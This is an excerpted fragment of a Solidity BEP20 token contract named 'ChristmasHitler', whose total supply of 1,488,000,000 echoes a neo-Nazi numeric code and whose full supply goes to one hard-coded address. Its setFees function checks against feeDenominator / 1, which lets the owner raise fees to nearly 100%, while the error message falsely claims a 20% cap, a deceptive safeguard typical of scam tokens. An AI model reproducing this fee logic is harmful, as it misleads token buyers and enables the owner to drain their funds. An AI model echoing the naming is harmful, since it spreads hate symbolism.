...
contract ChristmasHitler is IBEP20, Auth {
    ...
    uint256 _totalSupply = 1488000000 * (10 ** _decimals);
...
_balances[0xf1Ee027222feC4aEcFfAFEdde9F86098A958b3e8] = _totalSupply / 1000000 *1000000;
    ...
    function setFees(uint256 _marketingFee, uint256 _feeDenominator) external authorized {
        ...
        require(totalFee < feeDenominator / 1, "Maximum allowed taxation on this contract is 20%.");
    }
